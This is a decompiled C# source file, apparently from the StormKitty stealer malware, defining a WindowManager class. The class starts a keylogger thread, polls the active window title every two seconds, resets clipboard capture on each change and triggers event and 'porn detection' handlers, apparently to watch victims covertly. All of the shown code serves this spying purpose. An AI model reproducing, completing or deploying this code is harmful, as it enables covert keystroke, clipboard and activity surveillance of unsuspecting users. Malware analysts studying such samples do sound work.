﻿using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using Keylogger;

namespace StormKitty
{
	// Token: 0x02000065 RID: 101
	internal sealed class WindowManager
	{
		// Token: 0x0600016E RID: 366
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x0600016F RID: 367
		[DllImport("user32.dll", SetLastError = true)]
		private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

		// Token: 0x06000170 RID: 368 RVA: 0x0000B8B8 File Offset: 0x00009AB8
		private static string GetActiveWindowTitle()
		{
			string result;
			try
			{
				uint processId;
				WindowManager.GetWindowThreadProcessId(WindowManager.GetForegroundWindow(), out processId);
				Process processById = Process.GetProcessById((int)processId);
				string text = processById.MainWindowTitle;
				if (string.IsNullOrWhiteSpace(text))
				{
					text = processById.ProcessName;
				}
				result = text;
			}
			catch (Exception)
			{
				result = "Unknown";
			}
			return result;
		}

		// Token: 0x06000171 RID: 369 RVA: 0x0000B910 File Offset: 0x00009B10
		private static void Run()
		{
			Keylogger.MainThread.Start();
			string b = "";
			for (;;)
			{
				Thread.Sleep(2000);
				WindowManager.ActiveWindow = WindowManager.GetActiveWindowTitle();
				if (WindowManager.ActiveWindow != b)
				{
					b = WindowManager.ActiveWindow;
					ClipboardManager.PrevClipboard = "";
					foreach (Action action in WindowManager.functions)
					{
						action();
					}
				}
			}
		}

		// Token: 0x040000E7 RID: 231
		public static string ActiveWindow;

		// Token: 0x040000E8 RID: 232
		public static Thread MainThread = new Thread(new ThreadStart(WindowManager.Run));

		// Token: 0x040000E9 RID: 233
		private static List<Action> functions = new List<Action>
		{
			new Action(EventManager.Action),
			new Action(PornDetection.Action)
		};
	}
}
